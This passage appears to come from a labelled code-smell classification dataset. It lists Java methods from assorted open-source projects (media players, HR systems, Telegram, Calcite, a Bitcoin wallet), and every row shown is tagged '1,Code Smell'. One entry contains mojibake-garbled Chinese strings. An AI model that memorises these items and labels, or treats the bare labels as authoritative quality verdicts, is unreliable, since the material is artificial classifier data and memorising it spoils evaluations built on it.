  List<MediaTrack[]> resultTracksFallback=null;
  for (  MediaTrack[] trackGroup : trackGroupList) {
    if (trackGroup != null && trackGroup.length >= 1) {
      MediaTrack mediaTrack=trackGroup[0];
      if (mediaTrack != null && mediaTrack.format != null) {
        if (Helpers.startsWith(mediaTrack.format.language,resultLanguage)) {
          if (resultTracks == null) {
            resultTracks=new ArrayList<>();
          }
          resultTracks.add(trackGroup);
        }
 else         if (Helpers.startsWith(mediaTrack.format.language,originLanguage)) {
          if (originTracks == null) {
            originTracks=new ArrayList<>();
          }
          originTracks.add(trackGroup);
        }
 else         if (Helpers.startsWith(mediaTrack.format.language,DEFAULT_LANGUAGE)) {
          if (resultTracksFallback == null) {
            resultTracksFallback=new ArrayList<>();
          }
          resultTracksFallback.add(trackGroup);
        }
      }
    }
  }
  if (resultTracks != null && !resultTracks.isEmpty()) {
    return resultTracks.toArray(new MediaTrack[0][]);
  }
  if (originTracks != null && !originTracks.isEmpty()) {
    return originTracks.toArray(new MediaTrack[0][]);
  }
  if (resultTracksFallback != null && !resultTracksFallback.isEmpty()) {
    return resultTracksFallback.toArray(new MediaTrack[0][]);
  }
  return trackGroupList;
}",1,Code Smell
"private List<Map<String,Object>> queryAttendanceEmpDetailByDate(List<HrmAttendanceClock> startEmployeeClockList,List<HrmAttendanceClock> endEmployeeClockList,List<String> dates,Long employeeId){
  List<Map<String,Object>> mapList=new ArrayList<>();
  HrmEmployee hrmEmployee=employeeService.getById(employeeId);
  long entryTimeMilli=LocalDateTimeUtil.toEpochMilli(hrmEmployee.getEntryTime());
  long createTimeMilli=LocalDateTimeUtil.toEpochMilli(hrmEmployee.getCreateTime().toLocalDate());
  long nowMilli=LocalDateTimeUtil.toEpochMilli(LocalDateTimeUtil.beginOfDay(LocalDateTime.now()));
  HrmAttendanceGroup hrmAttendanceGroup=attendanceGroupService.queryAttendanceGroup(employeeId);
  Map<String,HrmAttendanceShift> hrmAttendanceShiftMap=getHrmAttendanceShiftMap(dates,hrmAttendanceGroup,employeeId);
  Map<String,QueryAttendanceRecordVO> startAttendanceRecordMap=queryStartRecordList(startEmployeeClockList,dates,hrmAttendanceShiftMap,employeeId,ONE);
  Map<String,QueryAttendanceRecordVO> endAttendanceRecordMap=queryEndRecordList(endEmployeeClockList,dates,hrmAttendanceShiftMap,employeeId,ONE);
  for (  String date : dates) {
    Map<String,Object> map=new HashMap<>();
    map.put(""date"",date);
    long currentMilli=LocalDateTimeUtil.toEpochMilli(DateUtil.parseDate(date).toLocalDateTime().toLocalDate());
    String startTimeStatus;
    String endTimeStatus;
    boolean currentDate=currentMilli > nowMilli;
    boolean entryTime=entryTimeMilli > currentMilli;
    boolean createTime=createTimeMilli > currentMilli;
    if (entryTime || currentDate || createTime) {
      map.put(""time"",new String[]{});
    }
 else {
      QueryAttendanceRecordVO startAttendanceRecordVO=startAttendanceRecordMap.get(date);
      QueryAttendanceRecordVO endAttendanceRecordVO=endAttendanceRecordMap.get(date);
      if (ObjectUtil.isNotNull(startAttendanceRecordVO.getClockTime())) {
        startTimeStatus=DateUtil.format(startAttendanceRecordVO.getClockTime(),""HH:mm"") + ""-"" + startAttendanceRecordVO.getStatus();
      }
 else {
        startTimeStatus=""-"" + startAttendanceRecordVO.getStatus();
      }
      if (ObjectUtil.isNotNull(endAttendanceRecordVO.getClockTime())) {
        endTimeStatus=DateUtil.format(endAttendanceRecordVO.getClockTime(),""HH:mm"") + ""-"" + endAttendanceRecordVO.getStatus();
      }
 else {
        endTimeStatus=""-"" + endAttendanceRecordVO.getStatus();
      }
      String timeStatus=""-3"";
      String timeStatusNine=""-9"";
      if (timeStatus.equals(startTimeStatus) && timeStatus.equals(endTimeStatus)) {
        map.put(""time"",new String[]{""-4""});
      }
 else       if (timeStatusNine.equals(startTimeStatus) && timeStatusNine.equals(endTimeStatus)) {
        map.put(""time"",new String[]{""-9""});
      }
 else {
        map.put(""time"",new String[]{startTimeStatus,endTimeStatus});
      }
    }
    mapList.add(map);
  }
  return mapList;
}",1,Code Smell
"private void processLoadedDiceStickers(String name,boolean isEmoji,TLRPC.TL_messages_stickerSet res,boolean cache,int date){
  AndroidUtilities.runOnUIThread(() -> loadingDiceStickerSets.remove(name));
  Utilities.stageQueue.postRunnable(() -> {
    if (cache && (res == null || Math.abs(System.currentTimeMillis() / 1000 - date) >= 60 * 60 * 24) || !cache && res == null) {
      AndroidUtilities.runOnUIThread(() -> loadStickersByEmojiOrName(name,isEmoji,false),res == null && !cache ? 1000 : 0);
      if (res == null) {
        return;
      }
    }
    if (res != null) {
      if (!cache) {
        putDiceStickersToCache(name,res,date);
      }
      AndroidUtilities.runOnUIThread(() -> {
        diceStickerSetsByEmoji.put(name,res);
        diceEmojiStickerSetsById.put(res.set.id,name);
        getNotificationCenter().postNotificationName(NotificationCenter.diceStickersDidLoad,name);
      }
);
    }
 else     if (!cache) {
      putDiceStickersToCache(name,null,date);
    }
  }
);
}",1,Code Smell
"public static List<Long> analyzeAuth(BiParams biParams){
  List<Long> userIdList=new ArrayList<>();
  Integer deptId=biParams.getDeptId();
  Long userId=biParams.getUserId();
  Integer isUser=biParams.getIsUser();
  if (isUser == 0) {
    if (deptId == null) {
      deptId=UserUtil.getUser().getDeptId();
    }
    AdminService adminService=ApplicationContextHolder.getBean(AdminService.class);
    List<Integer> deptIdList=adminService.queryChildDeptId(deptId).getData();
    deptIdList.add(deptId);
    userIdList.addAll(adminService.queryUserByDeptIds(deptIdList).getData());
  }
 else {
    if (userId == null) {
      userIdList.addAll(ApplicationContextHolder.getBean(AdminService.class).queryChildUserId(UserUtil.getUserId()).getData());
      userIdList.add(UserUtil.getUserId());
    }
 else {
      userIdList.add(userId);
    }
  }
  Integer menuId=biParams.getMenuId();
  dataFilter(menuId,userIdList);
  return userIdList;
}",1,Code Smell
"private static void requestVivoFloatPermission(Context context){
  Intent vivoIntent=new Intent();
  String model=BrandUtils.getModel();
  boolean isVivoY85=false;
  if (!TextUtils.isEmpty(model)) {
    isVivoY85=model.contains(""Y85"") && !model.contains(""Y85A"");
  }
  if (!TextUtils.isEmpty(model) && (isVivoY85 || model.contains(""vivo Y53L""))) {
    vivoIntent.setClassName(""com.vivo.permissionmanager"",""com.vivo.permissionmanager.activity.PurviewTabActivity"");
    vivoIntent.putExtra(""tabId"",""1"");
  }
 else {
    vivoIntent.setClassName(""com.vivo.permissionmanager"",""com.vivo.permissionmanager.activity.SoftPermissionDetailActivity"");
    vivoIntent.setAction(""secure.intent.action.softPermissionDetail"");
  }
  vivoIntent.putExtra(""packagename"",context.getPackageName());
  vivoIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
  context.startActivity(vivoIntent);
}",1,Code Smell
"@Override public boolean onTouch(View view,MotionEvent motionEvent){
  if (child() == null) {
    return false;
  }
  if (!enableZoom && !enableDrag) {
    return false;
  }
  int y=(int)motionEvent.getY();
  int x=(int)motionEvent.getX();
switch (motionEvent.getAction() & MotionEvent.ACTION_MASK) {
case MotionEvent.ACTION_DOWN:
    Log.i(TAG,""DOWN"");
  lastX=x;
lastY=y;
if (scale > MIN_ZOOM) {
mode=Mode.DRAG_ZOOM;
startX=motionEvent.getX() - prevDx;
startY=motionEvent.getY() - prevDy;
}
 else {
mode=Mode.DRAG;
}
break;
case MotionEvent.ACTION_MOVE:
if (enableDrag) {
if (mode == Mode.DRAG_ZOOM) {
dx=motionEvent.getX() - startX;
dy=motionEvent.getY() - startY;
}
 else if (mode == Mode.DRAG) {
float tmp=y - lastY;
setY(tmp);
if (dragListener != null) {
dragListener.onDragOffset(tmp,getViewHeight() / 6);
}
}
}
break;
case MotionEvent.ACTION_POINTER_DOWN:
mode=Mode.ZOOM;
break;
case MotionEvent.ACTION_POINTER_UP:
mode=Mode.NONE;
break;
case MotionEvent.ACTION_UP:
Log.i(TAG,""UP"");
if (enableDrag && mode == Mode.DRAG) {
float tmp=y - lastY;
if (scale > 1 || Math.abs(tmp) < getViewHeight() / 6) {
new TranslateUpAnimator(ZoomableFrameLayout.this,tmp,0);
}
 else {
new TranslateUpAnimator(ZoomableFrameLayout.this,tmp,tmp > 0 ? getViewHeight() : -getViewHeight()).addListener(new AnimatorListenerAdapter(){
@Override public void onAnimationEnd(Animator animation){
if (dragListener != null) {
dragListener.onDragToFinish();
}
}
}
);
}
}
mode=Mode.NONE;
prevDx=dx;
prevDy=dy;
if (Math.abs(y - lastY) < 5 && Math.abs(x - lastX) < 5) {
if (onClickListener != null) {
onClickListener.onClick(ZoomableFrameLayout.this);
}
}
break;
}
scaleDetector.onTouchEvent(motionEvent);
if ((mode == Mode.DRAG_ZOOM && scale >= MIN_ZOOM) || mode == Mode.ZOOM) {
getParent().requestDisallowInterceptTouchEvent(true);
float maxDx=child().getWidth() * (scale - 1);
float maxDy=child().getHeight() * (scale - 1);
dx=Math.min(Math.max(dx,-maxDx),0);
dy=Math.min(Math.max(dy,-maxDy),0);
Log.i(TAG,""Width: "" + child().getWidth() + "", scale ""+ scale+ "", dx ""+ dx+ "", max ""+ maxDx);
applyScaleAndTranslation();
}
return true;
}",1,Code Smell
"/** 
 * Tests that CAST fails when given a value just outside the valid range for that type. For example, <ul> <li>CAST(-200 AS TINYINT) fails because the value is less than -128; <li>CAST(1E-999 AS FLOAT) fails because the value underflows; <li>CAST(123.4567891234567 AS FLOAT) fails because the value loses precision. </ul>
 */
@Test public void testLiteralBeyondLimit(){
  tester.setFor(SqlStdOperatorTable.CAST);
  final List<RelDataType> types=SqlLimitsTest.getTypes(tester.getValidator().getTypeFactory());
  for (  RelDataType type : types) {
    for (    Object o : getValues((BasicSqlType)type,false)) {
      SqlLiteral literal=type.getSqlTypeName().createLiteral(o,SqlParserPos.ZERO);
      SqlString literalString=literal.toSqlString(AnsiSqlDialect.DEFAULT);
      if ((type.getSqlTypeName() == SqlTypeName.BIGINT) || ((type.getSqlTypeName() == SqlTypeName.DECIMAL) && (type.getPrecision() == 19))) {
        tester.checkFails(""CAST(^"" + literalString + ""^ AS ""+ type+ "")"",""Numeric literal '.*' out of range"",false);
      }
 else       if ((type.getSqlTypeName() == SqlTypeName.CHAR) || (type.getSqlTypeName() == SqlTypeName.VARCHAR) || (type.getSqlTypeName() == SqlTypeName.BINARY)|| (type.getSqlTypeName() == SqlTypeName.VARBINARY)) {
      }
 else {
        if (Bug.CALCITE_2539_FIXED) {
          tester.checkFails(""CAST("" + literalString + "" AS ""+ type+ "")"",""(?s).*(Overflow during calculation or cast\\.|Code=22003).*"",true);
        }
      }
    }
  }
}",1,Code Smell
"private String getVersionFromRequestData(RequestData requestData){
  Map<String,String> queryMap=QueryUtils.getQueryMap(requestData.getUrl());
  if (MapUtils.isNotEmpty(queryMap) && queryMap.containsKey(CommonConstant.Z_L_T_VERSION) && StringUtils.isNotBlank(queryMap.get(CommonConstant.Z_L_T_VERSION))) {
    return queryMap.get(CommonConstant.Z_L_T_VERSION);
  }
 else   if (requestData.getHeaders().containsKey(CommonConstant.Z_L_T_VERSION)) {
    return requestData.getHeaders().get(CommonConstant.Z_L_T_VERSION).get(0);
  }
  return null;
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite default Ingredient toNMS(RecipeChoice bukkit,boolean requireNotEmpty){
  Ingredient stack;
  if (bukkit == null) {
    stack=Ingredient.EMPTY;
  }
 else   if (bukkit instanceof RecipeChoice.MaterialChoice) {
    stack=new Ingredient(((RecipeChoice.MaterialChoice)bukkit).getChoices().stream().map((mat) -> {
      return new Ingredient.ItemValue(CraftItemStack.asNMSCopy(new ItemStack(mat)));
    }
));
  }
 else   if (bukkit instanceof RecipeChoice.ExactChoice) {
    stack=new Ingredient(((RecipeChoice.ExactChoice)bukkit).getChoices().stream().map((mat) -> {
      return new Ingredient.ItemValue(CraftItemStack.asNMSCopy(mat));
    }
));
    ((IngredientBridge)(Object)stack).bridge$setExact(true);
  }
 else   if (bukkit instanceof ArclightSpecialIngredient) {
    stack=((ArclightSpecialIngredient)bukkit).getIngredient();
  }
 else {
    throw new IllegalArgumentException(""Unknown recipe stack instance "" + bukkit);
  }
  stack.getItems();
  if (stack.getClass() == Ingredient.class && requireNotEmpty && stack.getItems().length == 0) {
    throw new IllegalArgumentException(""Recipe requires at least one non-air choice!"");
  }
 else {
    return stack;
  }
}",1,Code Smell
"public static void claimPayNym(Wallet wallet,Map<String,Object> createMap,boolean segwit){
  if (createMap.get(""claimed"") == Boolean.FALSE) {
    getAuthToken(wallet,createMap).subscribe(authToken -> {
      String signature=getSignature(wallet,authToken);
      claimPayNym(authToken,signature).subscribe(claimMap -> {
        log.debug(""Claimed payment code "" + claimMap.get(""claimed""));
        addPaymentCode(getPaymentCode(wallet),authToken,signature,segwit).subscribe(addMap -> {
          log.debug(""Added payment code "" + addMap);
        }
);
      }
,error -> {
        getAuthToken(wallet,new HashMap<>()).subscribe(newAuthToken -> {
          String newSignature=getSignature(wallet,newAuthToken);
          claimPayNym(newAuthToken,newSignature).subscribe(claimMap -> {
            log.debug(""Claimed payment code "" + claimMap.get(""claimed""));
            addPaymentCode(getPaymentCode(wallet),newAuthToken,newSignature,segwit).subscribe(addMap -> {
              log.debug(""Added payment code "" + addMap);
            }
);
          }
,newError -> {
            log.error(""Error claiming PayNym with new authToken"",newError);
          }
);
        }
,newError -> {
          log.error(""Error retrieving new authToken"",newError);
        }
);
      }
);
    }
,error -> {
      log.error(""Error retrieving authToken"",error);
    }
);
  }
}
private static Observable<Map<String,Object>> claimPayNym(String authToken,String signature){
  Map<String,String> headers=new HashMap<>();
  headers.put(""content-type"",""application/json"");
  headers.put(""auth-token"",authToken);
  HashMap<String,Object> body=new HashMap<>();
  body.put(""signature"",signature);
  String url=getHostUrl() + ""/api/v1/claim"";
  if (log.isInfoEnabled()) {
    log.info(""Claiming PayNym using "" + url);
  }
  return AppServices.getHttpClientService().postJson(url,Map.class,headers,body).subscribeOn(Schedulers.io()).observeOn(JavaFxScheduler.platform()).map(o -> o.get());
}",1,Code Smell
"@Override public Xml preVisit(Xml tree,P p){
  Xml x=super.preVisit(tree,p);
  if (x != null) {
    String prefix=x.getPrefix();
    if (prefix.contains(""\n"")) {
      int indentMultiple=(int)getCursor().getPathAsStream().filter(Xml.Tag.class::isInstance).count() - 1;
      if (getCursor().getValue() instanceof Xml.Attribute || getCursor().getValue() instanceof Xml.CharData || getCursor().getValue() instanceof Xml.Comment|| getCursor().getValue() instanceof Xml.ProcessingInstruction) {
        indentMultiple++;
      }
      StringBuilder shiftedPrefixBuilder=new StringBuilder(prefix.substring(0,prefix.lastIndexOf('\n') + 1));
      for (int i=0; i < indentMultiple; i++) {
        if (style.getUseTabCharacter()) {
          shiftedPrefixBuilder.append(""\t"");
        }
 else {
          for (int j=0; j < (x instanceof Xml.Attribute ? style.getContinuationIndentSize() : style.getIndentSize()); j++) {
            shiftedPrefixBuilder.append("" "");
          }
        }
      }
      String shiftedPrefix=shiftedPrefixBuilder.toString();
      if (!shiftedPrefix.equals(prefix)) {
        return x.withPrefix(shiftedPrefix);
      }
    }
  }
  return x;
}",1,Code Smell
"public void setFunction(Function function){
  int isWhirlpoolWallet=getWalletData().getWalletForm().getWallet().isWhirlpoolChildWallet() ? 1 : 0;
  if (function == Function.TRANSACTIONS) {
    actions.setSelectedIndex(0);
  }
 else   if (function == Function.RECEIVE) {
    actions.setSelectedIndex(1);
  }
 else   if (function == Function.ADDRESSES) {
    actions.setSelectedIndex(2 - isWhirlpoolWallet);
  }
 else   if (function == Function.UTXOS) {
    actions.setSelectedIndex(3 - isWhirlpoolWallet);
  }
}",1,Code Smell
"@Override public boolean onKey(View view,int keyCode,KeyEvent keyEvent){
switch (keyCode) {
case KeyEvent.KEYCODE_DPAD_UP:
case KeyEvent.KEYCODE_DPAD_DOWN:
    return mInSeek;
case KeyEvent.KEYCODE_DPAD_LEFT:
case KeyEvent.KEYCODE_MINUS:
case KeyEvent.KEYCODE_MEDIA_REWIND:
  if (keyEvent.getAction() == KeyEvent.ACTION_DOWN) {
    onBackward();
  }
return true;
case KeyEvent.KEYCODE_DPAD_RIGHT:
case KeyEvent.KEYCODE_PLUS:
case KeyEvent.KEYCODE_MEDIA_FAST_FORWARD:
if (keyEvent.getAction() == KeyEvent.ACTION_DOWN) {
onForward();
}
return true;
case KeyEvent.KEYCODE_DPAD_CENTER:
case KeyEvent.KEYCODE_ENTER:
if (!mInSeek) {
return false;
}
if (keyEvent.getAction() == KeyEvent.ACTION_UP) {
stopSeek(false);
}
return true;
case KeyEvent.KEYCODE_BACK:
case KeyEvent.KEYCODE_ESCAPE:
if (!mInSeek) {
return false;
}
if (keyEvent.getAction() == KeyEvent.ACTION_UP) {
stopSeek(Build.VERSION.SDK_INT >= 21 ? !mProgressBar.isAccessibilityFocused() : true);
}
return true;
}
return false;
}",1,Code Smell
"private void convertEventOrThrow(InputEventObserver.InputEvent event) throws IOException {
  if (mLastEventTime == 0) {
    mLastEventTime=event.time;
  }
 else   if (event.time - mLastEventTime > 0.001) {
    writeSleep((int)(1000L * (event.time - mLastEventTime)));
    mLastEventTime=event.time;
  }
  int device=parseDeviceNumber(event.device);
  short type=(short)Long.parseLong(event.type,16);
  short code=(short)Long.parseLong(event.code,16);
  int value=(int)Long.parseLong(event.value,16);
  if (type == InputEventCodes.EV_ABS) {
    if (code == InputEventCodes.ABS_MT_POSITION_X || code == InputEventCodes.ABS_MT_POSITION_Y) {
      mTouchDevice=device;
      RootAutomatorEngine.setTouchDevice(device);
      writeTouch(code,value);
      return;
    }
  }
  if (type == InputEventCodes.EV_SYN && code == InputEventCodes.SYN_REPORT && value == 0) {
    writeSyncReport();
    return;
  }
  if (device != mTouchDevice) {
    return;
  }
  mDataOutputStream.writeByte(RootAutomator.DATA_TYPE_EVENT);
  mDataOutputStream.writeShort(type);
  mDataOutputStream.writeShort(code);
  mDataOutputStream.writeInt(value);
  Log.d(LOG_TAG,""write event: "" + event);
}",1,Code Smell
"/** 
 * Updates the codec operating rate.
 * @throws ExoPlaybackException If an error occurs releasing or initializing a codec.
 */
private void updateCodecOperatingRate() throws ExoPlaybackException {
  if (Util.SDK_INT < 23) {
    return;
  }
  float newCodecOperatingRate=getCodecOperatingRateV23(rendererOperatingRate,codecFormat,getStreamFormats());
  if (codecOperatingRate == newCodecOperatingRate) {
  }
 else   if (newCodecOperatingRate == CODEC_OPERATING_RATE_UNSET) {
    drainAndReinitializeCodec();
  }
 else   if (codecOperatingRate != CODEC_OPERATING_RATE_UNSET || newCodecOperatingRate > assumedMinimumCodecOperatingRate) {
    Bundle codecParameters=new Bundle();
    codecParameters.putFloat(MediaFormat.KEY_OPERATING_RATE,newCodecOperatingRate);
    codec.setParameters(codecParameters);
    codecOperatingRate=newCodecOperatingRate;
  }
}",1,Code Smell
"/** 
 * 淇敼
 */
@PutMapping @PreAuthorize(""@ss.hasPermi('system:user:edit')"") public R update(@Validated @RequestBody SysUserEntity user){
  userService.checkUserAllowed(user);
  if (!(userService.checkUserNameUnique(user))) {
    return R.error(""淇敼鐢ㄦ埛'"" + user.getUserName() + ""'澶辫触锛岀櫥褰曡处鍙峰凡瀛樺湪"");
  }
 else   if (StringUtils.isNotEmpty(user.getPhonenumber()) && !(userService.checkPhoneUnique(user))) {
    return R.error(""淇敼鐢ㄦ埛'"" + user.getUserName() + ""'澶辫触锛屾墜鏈哄彿鐮佸凡瀛樺湪"");
  }
 else   if (StringUtils.isNotEmpty(user.getEmail()) && !(userService.checkEmailUnique(user))) {
    return R.error(""淇敼鐢ㄦ埛'"" + user.getUserName() + ""'澶辫触锛岄偖绠辫处鍙峰凡瀛樺湪"");
  }
  user.setPassword(null);
  return R.ok(userService.updateUser(user));
}
",1,Code Smell
"private ScopeChild findChild(List<String> names,SqlNameMatcher nameMatcher){
  for (  ScopeChild child : children) {
    String lastName=Util.last(names);
    if (child.name != null) {
      if (!nameMatcher.matches(child.name,lastName)) {
        continue;
      }
      if (names.size() == 1) {
        return child;
      }
    }
    final SqlValidatorTable table=child.namespace.getTable();
    if (table != null) {
      final ResolvedImpl resolved=new ResolvedImpl();
      resolveTable(names,nameMatcher,Path.EMPTY,resolved);
      if (resolved.count() == 1 && resolved.only().remainingNames.isEmpty() && resolved.only().namespace instanceof TableNamespace && resolved.only().namespace.getTable().getQualifiedName().equals(table.getQualifiedName())) {
        return child;
      }
    }
  }
  return null;
}",1,Code Smell
"public List<Message> getMessages(){
  if (isLoaded()) {
    if (!mediaCompositeMessageLoaded && !TextUtils.isEmpty(localPath) && new File(localPath).exists()) {
      decodeMediaCompositeMessages();
      mediaCompositeMessageLoaded=true;
    }
 else     if (this.messages == null && this.binaryContent != null && this.binaryContent.length > 0) {
      decodeMessages(this.binaryContent,ChatManager.Instance()::messageContentFromPayload);
    }
  }
 else {
    if (this.binaryContent != null && this.binaryContent.length > 0) {
      decodeMessages(this.binaryContent,ChatManager.Instance()::messageContentFromPayload);
    }
  }
  return messages;
}",1,Code Smell
"public static void createBlockDialogAlert(BaseFragment fragment,int count,boolean reportSpam,TLRPC.User user,BlockDialogCallback onProcessRunnable){
  if (fragment == null || fragment.getParentActivity() == null || count == 1 && user == null) {
    return;
  }
  Context context=fragment.getParentActivity();
  AlertDialog.Builder builder=new AlertDialog.Builder(context);
  CheckBoxCell[] cell=new CheckBoxCell[2];
  LinearLayout linearLayout=new LinearLayout(context);
  linearLayout.setOrientation(LinearLayout.VERTICAL);
  builder.setView(linearLayout);
  String actionText;
  if (count == 1) {
    String name=ContactsController.formatName(user.first_name,user.last_name);
    builder.setTitle(LocaleController.formatString(""BlockUserTitle"",R.string.BlockUserTitle,name));
    actionText=LocaleController.getString(""BlockUser"",R.string.BlockUser);
    builder.setMessage(AndroidUtilities.replaceTags(LocaleController.formatString(""BlockUserMessage"",R.string.BlockUserMessage,name)));
  }
 else {
    builder.setTitle(LocaleController.formatString(""BlockUserTitle"",R.string.BlockUserTitle,LocaleController.formatPluralString(""UsersCountTitle"",count)));
    actionText=LocaleController.getString(""BlockUsers"",R.string.BlockUsers);
    builder.setMessage(AndroidUtilities.replaceTags(LocaleController.formatString(""BlockUsersMessage"",R.string.BlockUsersMessage,LocaleController.formatPluralString(""UsersCount"",count))));
  }
  final boolean[] checks=new boolean[]{true,true};
  for (int a=0; a < cell.length; a++) {
    if (a == 0 && !reportSpam) {
      continue;
    }
    int num=a;
    cell[a]=new CheckBoxCell(context,1);
    cell[a].setBackgroundDrawable(Theme.getSelectorDrawable(false));
    if (a == 0) {
      cell[a].setText(LocaleController.getString(""ReportSpamTitle"",R.string.ReportSpamTitle),"""",true,false);
    }
 else {
      cell[a].setText(count == 1 ? LocaleController.getString(""DeleteThisChatBothSides"",R.string.DeleteThisChatBothSides) : LocaleController.getString(""DeleteTheseChatsBothSides"",R.string.DeleteTheseChatsBothSides),"""",true,false);
    }
    cell[a].setPadding(LocaleController.isRTL ? dp(16) : dp(8),0,LocaleController.isRTL ? dp(8) : dp(16),0);
    linearLayout.addView(cell[a],LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT,48));
    cell[a].setOnClickListener(v -> {
      CheckBoxCell cell1=(CheckBoxCell)v;
      checks[num]=!checks[num];
      cell1.setChecked(checks[num],true);
    }
);
  }
  builder.setPositiveButton(actionText,(dialogInterface,i) -> onProcessRunnable.run(checks[0],checks[1]));
  builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
  AlertDialog alertDialog=builder.create();
  fragment.showDialog(alertDialog);
  TextView button=(TextView)alertDialog.getButton(DialogInterface.BUTTON_POSITIVE);
  if (button != null) {
    button.setTextColor(Theme.getColor(Theme.key_text_RedBold));
  }
}",1,Code Smell
"protected void stickerDraw(Canvas canvas){
  if (containerView == null) {
    return;
  }
  canvas.save();
  float mirrorT=this.mirrorT.set(mirrored);
  canvas.scale(1 - mirrorT * 2,1f,baseSize.width / 2f,0);
  canvas.skew(0,4 * mirrorT * (1f - mirrorT)* .25f);
  final float segmentedT=this.segmentedT.set(segmented);
  if (!segmented) {
    centerImage.setAlpha(1f - segmentedT);
    centerImage.setImageCoords(0,0,(int)baseSize.width,(int)baseSize.height);
    centerImage.draw(canvas);
    if (segmentedT > 0) {
      drawSegmented(canvas);
    }
    if (segmentedImage != null) {
      canvas.saveLayerAlpha(0,0,baseSize.width,baseSize.height,0xFF,Canvas.ALL_SAVE_FLAG);
      drawSegmented(canvas);
      canvas.save();
      final long now=System.currentTimeMillis();
      if (highlightStart <= 0) {
        highlightStart=now;
      }
      final float gradientWidth=.80f * baseSize.width;
      final float highlightT=(now - highlightStart) / 1000f;
      final float translate=highlightT * (2 * gradientWidth + baseSize.width) - gradientWidth;
      if (highlightPaint == null) {
        highlightPaint=new Paint(Paint.ANTI_ALIAS_FLAG);
        highlightPaint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));
        highlightGradient=new LinearGradient(0,0,gradientWidth,0,new int[]{0x00feee8c,0x66feee8c,0x66feee8c,0x00feee8c},new float[]{0,.4f,.6f,1f},Shader.TileMode.CLAMP);
        highlightGradientMatrix=new Matrix();
        highlightGradient.setLocalMatrix(highlightGradientMatrix);
        highlightPaint.setShader(highlightGradient);
      }
      highlightGradientMatrix.reset();
      highlightGradientMatrix.postTranslate(translate,0);
      highlightGradient.setLocalMatrix(highlightGradientMatrix);
      canvas.drawRect(0,0,(int)baseSize.width,(int)baseSize.height,highlightPaint);
      canvas.restore();
      canvas.restore();
      if ((highlightT > 0 || needHighlight) && highlightT < 1f) {
        needHighlight=false;
        containerView.invalidate();
      }
    }
  }
 else {
    highlightStart=-1;
    needHighlight=false;
    if (!overridenSegmented) {
      centerImage.setImageCoords(0,0,(int)baseSize.width,(int)baseSize.height);
      centerImage.setAlpha(1f);
      centerImage.draw(canvas);
    }
    drawSegmented(canvas);
  }
  canvas.restore();
}",1,Code Smell
"/** 
 * Processes one file, which may be either a class or a resource.
 * @param name {@code non-null;} name of the file
 * @param bytes {@code non-null;} contents of the file
 * @return whether processing was successful
 */
private boolean processFileBytes(String name,long lastModified,byte[] bytes){
  boolean isClass=name.endsWith("".class"");
  boolean isClassesDex=name.equals(DexFormat.DEX_IN_JAR_NAME);
  boolean keepResources=(outputResources != null);
  if (!isClass && !isClassesDex && !keepResources) {
    if (args.verbose) {
      context.out.println(""ignored resource "" + name);
    }
    return false;
  }
  if (args.verbose) {
    context.out.println(""processing "" + name + ""..."");
  }
  String fixedName=fixPath(name);
  if (isClass) {
    if (keepResources && args.keepClassesInJar) {
synchronized (outputResources) {
        outputResources.put(fixedName,bytes);
      }
    }
    if (lastModified < minimumFileAge) {
      return true;
    }
    processClass(fixedName,bytes);
    return false;
  }
 else   if (isClassesDex) {
synchronized (libraryDexBuffers) {
      libraryDexBuffers.add(bytes);
    }
    return true;
  }
 else {
synchronized (outputResources) {
      outputResources.put(fixedName,bytes);
    }
    return true;
  }
}
@Override public boolean processFileBytes(String name,long lastModified,byte[] bytes){
  return Main.this.processFileBytes(name,lastModified,bytes);
}
",1,Code Smell
"@EventHandler private void onEntityAdded(EntityAddedEvent event){
  if (!(event.entity instanceof PlayerEntity) || event.entity.getUuid().equals(mc.player.getUuid()))   return;
  if (!ignoreFriends.get() || (ignoreFriends.get() && !Friends.get().isFriend((PlayerEntity)event.entity))) {
    ChatUtils.sendPlayerMsg(""/msg "" + event.entity.getName().getString() + "" ""+ message.get());
  }
}
",1,Code Smell
"/** 
 * Authenticated USER: 1) users with ROLE SUPER_ADMIN/ADMIN, 2) TestTaskSpec and related resources (Agent/Device/Group) should have a uniform same teamId as user
 */
@PostMapping(value={Const.Path.TEST_TASK_RUN},produces=MediaType.APPLICATION_JSON_VALUE) public Result<Object> runTestTask(@CurrentSecurityContext SysUser requestor,@RequestBody TestTaskSpec testTaskSpec){
  try {
    if (requestor == null) {
      return Result.error(HttpStatus.UNAUTHORIZED.value(),""unauthorized"");
    }
    JSONObject result=new JSONObject();
    TestFileSet testFileSet=testFileSetService.getFileSetInfo(testTaskSpec.fileSetId);
    if (testFileSet == null) {
      return Result.error(HttpStatus.NOT_FOUND.value(),""no such test file set"");
    }
    testTaskSpec.testFileSet=testFileSet;
    testTaskSpec.teamId=testFileSet.getTeamId();
    testTaskSpec.teamName=testFileSet.getTeamName();
    testTaskSpec.testTaskId=UUID.randomUUID().toString();
    if (!sysUserService.checkUserAdmin(requestor)) {
      if (!userTeamManagementService.checkRequestorTeamRelation(requestor,testTaskSpec.teamId)) {
        return Result.error(HttpStatus.UNAUTHORIZED.value(),""Unauthorized, the TestFileSet doesn't belong to user's Teams"");
      }
      testTaskService.checkTestTaskTeamConsistency(testTaskSpec);
    }
    if (testTaskService.isQueueEmpty() || Task.RunnerType.APK_SCANNER.name().equals(testTaskSpec.runningType) || testTaskService.isDeviceFree(testTaskSpec.deviceIdentifier)) {
      result=deviceAgentManagementService.runTestTaskBySpec(testTaskSpec);
      if (result.get(Const.Param.TEST_DEVICE_SN) == null) {
        testTaskService.addTask(testTaskSpec);
      }
 else {
        Task task=Task.RunnerType.valueOf(testTaskSpec.runningType).transferToTask(testTaskSpec);
        task.setDeviceCount(result.getString(Const.Param.TEST_DEVICE_SN).split("","").length);
        testDataService.saveTaskData(task);
      }
    }
 else {
      testTaskService.addTask(testTaskSpec);
    }
    if (result.get(Const.Param.TEST_DEVICE_SN) == null) {
      result.put(""message"",""Device is under testing, test task has been added to a queue, please wait for a minute!"");
    }
    result.put(Const.Param.TEST_TASK_ID,testTaskSpec.testTaskId);
    return Result.ok(result);
  }
 catch (  HydraLabRuntimeException e) {
    return Result.error(e.getCode(),e);
  }
catch (  IllegalArgumentException e) {
    logger.error(e.getMessage(),e);
    return Result.error(HttpStatus.BAD_REQUEST.value(),e);
  }
catch (  Exception e) {
